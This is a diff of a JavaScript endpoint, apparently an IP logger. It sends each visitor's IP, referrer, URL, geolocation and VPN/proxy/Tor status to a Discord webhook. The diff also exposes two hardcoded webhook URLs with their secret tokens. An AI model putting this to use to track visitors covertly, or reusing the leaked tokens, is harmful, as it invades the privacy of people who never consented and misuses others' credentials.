@@ -2,7 +2,8 @@ import fetch from 'node-fetch';
 
 export default async (req, res) => {
     if (req.method === 'POST') {
-        const discordWebhookUrl = 'https://discord.com/api/webhooks/1303905695208570890/hqxllBpBroaolym0eh6KgVZE0vBlDu4Ng-yh9F1Tc4fhtlXm9J_odrDJWI6WMF3-2qr4';
+        const discordWebhookUrl = 'https://discord.com/api/webhooks/1303414607263826002/8u9YBbZiHiRm1dE2cO_wUFFYe6YFTkkouDgoZt-LIYTwVhtYJa1_AM-qDxXajHpWnnsT';
+        const vpnApiUrl = 'https://vpnapi.io/api/{API_KEY}'; // Replace {API_KEY} with your actual VPN API key
 
         try {
             const {
@@ -34,7 +35,20 @@ export default async (req, res) => {
             // Get public IP from headers (proxy/IP forwarding)
             const publicIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
 
-            // Send information to Discord
+            // Call the VPN detection API
+            const vpnResponse = await fetch(`${vpnApiUrl}?ip=${publicIP}`);
+            const vpnData = await vpnResponse.json();
+
+            // VPN API will return details about the IP
+            const isVPN = vpnData.security.is_vpn || false;
+            const vpnProvider = vpnData.security.vpn_provider || 'Unknown';
+            const isProxy = vpnData.security.is_proxy || false;
+            const isTor = vpnData.security.is_tor || false;
+
+            // Get geolocation info
+            const geoLocation = vpnData.location || {};
+
+            // Log the gathered information to Discord
             const logMessage = {
                 embeds: [
                     {
@@ -62,6 +76,17 @@ export default async (req, res) => {
                             **Referrer URL:** \`${referrer || 'No referrer'}\`
                             **Current URL:** \`${currentURL || 'N/A'}\`
                             **Timestamp:** \`${timestamp || new Date().toISOString()}\`
+
+                            **Geolocation Information:**
+                            - Country: \`${geoLocation.country || 'N/A'}\`
+                            - Region: \`${geoLocation.region || 'N/A'}\`
+                            - City: \`${geoLocation.city || 'N/A'}\`
+
+                            **VPN/Proxy Information:**
+                            - VPN Detected: \`${isVPN ? 'Yes' : 'No'}\`
+                            - VPN Provider: \`${vpnProvider}\`
+                            - Proxy Detected: \`${isProxy ? 'Yes' : 'No'}\`
+                            - Tor Detected: \`${isTor ? 'Yes' : 'No'}\`
                         `,
                         color: 0x00FF00,
                         timestamp: new Date(),
@@ -69,6 +94,7 @@ export default async (req, res) => {
                 ],
             };
 
+            // Send data to Discord
             const response = await fetch(discordWebhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
